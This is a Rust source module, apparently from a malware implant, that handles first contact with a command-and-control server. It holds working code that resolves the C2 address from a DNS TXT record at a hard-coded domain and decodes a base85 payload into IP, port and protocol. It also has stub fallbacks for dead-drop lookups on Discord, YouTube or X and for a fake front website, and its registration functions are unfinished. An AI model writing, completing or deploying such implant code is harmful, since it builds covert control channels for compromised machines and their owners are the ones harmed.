use crate::{
    identity::Identity,
    registration::{
        errors::{
            DeadDropReachError, DnsReachError, ReachError, RegistrationError, WebsiteReachError,
        },
        types::{ReachCommMode, ReachInfo},
    },
};
use hickory_resolver::Resolver;
use std::net::Ipv4Addr;

mod errors;
mod types;

/**
 * The process of reaching the C2 for the first time, registering the node and establishing a mode of operation.
 */

pub async fn run(identity: &Identity) -> Result<(), RegistrationError> {
    let reach_info = reach_c2().await?;

    match reach_info.comm_mode {
        ReachCommMode::HTTP => register_self_http(&reach_info, identity).await?,
        ReachCommMode::UDP => register_self_udp(&reach_info, identity).await?,
    };

    Ok(())
}

async fn register_self_http(
    reach_info: &ReachInfo,
    identity: &Identity,
) -> Result<(), RegistrationError> {
    let _ = (reach_info, identity);
    Err(RegistrationError::Unknown("Not yet implemented".into()))
}

async fn register_self_udp(
    reach_info: &ReachInfo,
    identity: &Identity,
) -> Result<(), RegistrationError> {

    // todo

    Ok(())
}

async fn reach_c2() -> Result<ReachInfo, ReachError> {
    // DNS
    match find_c2_dns().await {
        Ok(info) => Ok(info),
        Err(dns_err) => {
            eprintln!("C2 reach via DNS failed: {dns_err}");

            // DEAD DROP
            match find_c2_deaddrop().await {
                Ok(info) => Ok(info),
                Err(deaddrop_err) => {
                    eprintln!("C2 reach via deaddrop failed: {deaddrop_err}");

                    // WEBSITE
                    match find_c2_website().await {
                        Ok(info) => Ok(info),
                        Err(website_err) => {
                            eprintln!("C2 reach via website failed: {website_err}");

                            // ALL FAILED
                            return Err(ReachError::AllMethodsFailed {
                                dns: dns_err,
                                deaddrop: deaddrop_err,
                                website: website_err,
                            });
                        }
                    }
                }
            }
        }
    }
}

async fn find_c2_dns() -> Result<ReachInfo, DnsReachError> {
    let resolver = Resolver::builder_tokio()?.build();
    let result = resolver.txt_lookup("korf.elstadt.com").await?;

    let first_record = result.iter().next().ok_or(DnsReachError::MissingRecord)?;
    let txt_data = first_record
        .txt_data()
        .first()
        .ok_or(DnsReachError::MissingRecord)?;

    /*
        IPv4 address: 4 bytes
        Port: 2 bytes
        Comm mode: 1 byte
            -> 0x00 = http
            -> 0x01 = udp
    */
    let bytes =
        base85::decode(str::from_utf8(txt_data)?).map_err(|_| DnsReachError::BadBase85Encoding)?;
    let bytes_len = bytes.len();

    if bytes_len < 7 {
        return Err(DnsReachError::PayloadTooShort(bytes_len));
    }

    Ok(ReachInfo {
        ipv4: Ipv4Addr::new(bytes[0], bytes[1], bytes[2], bytes[3]),
        port: u16::from_ne_bytes([bytes[4], bytes[5]]),
        comm_mode: match bytes[6] {
            0x00 => ReachCommMode::HTTP,
            0x01 => ReachCommMode::UDP,
            b => return Err(DnsReachError::UnknownCommMode(b)),
        },
    })
}

async fn find_c2_deaddrop() -> Result<ReachInfo, DeadDropReachError> {
    Err(DeadDropReachError::Unknown("Not implemented".into())) // todo: look inside some deaddrop: discord, yt, x or whatever
}

async fn find_c2_website() -> Result<ReachInfo, WebsiteReachError> {
    Err(WebsiteReachError::Unknown("Not implemented".into())) // todo: request to some fake front website for the reach info
}
